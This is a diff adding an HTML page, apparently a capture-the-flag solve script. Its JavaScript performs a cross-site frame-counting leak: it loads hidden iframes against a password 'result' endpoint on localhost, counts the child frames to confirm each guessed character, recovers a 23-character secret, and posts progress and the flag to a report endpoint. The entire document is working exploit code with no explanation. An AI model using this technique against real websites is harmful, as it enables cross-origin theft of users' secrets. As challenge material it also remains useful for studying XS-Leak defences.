@@ -1,0 +1,82 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>exploit</title></head>
+<body>
+<h1>solve</h1>
+<pre id="log"></pre>
+<script>
+const USERHOST_ID = location.pathname.split('/')[1];
+const ORACLE = 'http://localhost:9000/result/' + USERHOST_ID + '?password=';
+const REPORT = 'http://localhost:9000/report/' + USERHOST_ID;
+
+const CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-!@#$%^&*()+=[]:;,.?/|~";
+const SECRET_LEN = 23;
+
+const logEl = document.getElementById('log');
+function log(s) { logEl.textContent += s + '\n'; }
+
+function countFrames(guess) {
+  return new Promise(function (resolve) {
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = ORACLE + encodeURIComponent(guess);
+    let done = false;
+    function finish() {
+      if (done) return;
+      done = true;
+      let n = 0;
+      try { n = iframe.contentWindow.length; } catch (e) { n = -1; }
+      iframe.remove();
+      resolve(n);
+    }
+    iframe.onload = function () { setTimeout(finish, 30); };
+    iframe.onerror = finish;
+    setTimeout(finish, 1500);
+    document.body.appendChild(iframe);
+  });
+}
+
+async function reportToServer(msg) {
+  try {
+    await fetch(REPORT, {
+      method: 'POST',
+      headers: { 'Content-Type': 'text/plain' },
+      body: msg
+    });
+  } catch (e) {}
+}
+
+async function solve() {
+  let secret = '';
+  log('starting leak...');
+
+  for (let pos = 0; pos < SECRET_LEN; pos++) {
+    let found = null;
+    for (const c of CHARS) {
+      const guess = secret + c;
+      const n = await countFrames(guess);
+      if (n === pos + 1) {
+        found = c;
+        secret = guess;
+        log('[+] pos ' + pos + ": '" + c + "' -> " + secret);
+        await reportToServer('progress: ' + secret);
+        break;
+      }
+    }
+    if (found === null) {
+      log('[!] stuck at ' + pos + ", secret='" + secret + "'");
+      await reportToServer('STUCK at ' + pos + ': ' + secret);
+      return;
+    }
+  }
+
+  const flag = 'FLAG{' + secret + '}';
+  log('SECRET: ' + secret);
+  log('FLAG:   ' + flag);
+  await reportToServer('FLAG=' + flag);
+}
+
+solve();
+</script>
+</body>
+</html>
